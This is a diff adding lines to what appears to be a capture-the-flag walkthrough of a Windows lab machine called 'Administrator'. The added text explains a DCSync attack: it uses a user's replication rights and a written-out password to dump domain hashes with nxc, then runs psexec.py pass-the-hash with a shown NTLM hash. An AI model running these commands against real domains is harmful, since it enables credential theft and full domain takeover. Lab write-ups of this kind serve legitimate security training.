@@ -411,14 +411,16 @@ We can't access through `win-rm` so we need to abuse from Linux
 
 ![](../../0.%20Assets/Administrator-1791378534011.webp)
 
-
+Becasuse `ethan` has the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` we can perform this attack, so let's ask the `DC` for the information in `ntds` and retrieve the hashes
 
 ```
 nxc smb $T -u ethan -p 'limpbizkit' --ntds
 ```
 
+
 ![](../../0.%20Assets/Administrator-1791378952156.webp)
 
+Now with the hash of the administrator we can perform a `PtH (pass the hash)` attack through `psexec`
 
 ```
 psexec.py administrator.htb/administrator@$T -hashes :3dc553ce4b9fd20bd016e098d2d2fd2e
